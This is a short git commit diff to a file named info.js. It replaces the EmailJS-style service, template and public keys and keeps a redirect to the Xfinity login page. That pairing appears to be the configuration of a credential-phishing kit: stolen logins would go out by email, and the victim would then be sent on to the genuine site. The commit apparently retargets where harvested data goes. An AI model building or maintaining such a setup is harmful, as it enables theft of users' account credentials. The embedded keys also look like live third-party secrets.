535c25d7c1ad917e49082cb07fd190544f864d11
wisefour1018 <wisefour1018@gmail.com>
2026-07-31 13:03:06 -0700

    Update info.js

--- info.js
+++ info.js
@@ -4,7 +4,7 @@
  *
  * /**/
 
-const SERVICE_KEY = "service_p4r4oiq";
-const TEMPLATE_KEY =  "template_1p8yk9h";
-const PUBLIC_KEY = "PYi35IP2IBPT8lg_C";
+const SERVICE_KEY = "service_e2pi6in";
+const TEMPLATE_KEY =  "template_bogyz0i";
+const PUBLIC_KEY = "38NlWmmQmivvUHQc6";
 const REDIRECT_URL = "https://login.xfinity.com/login?";
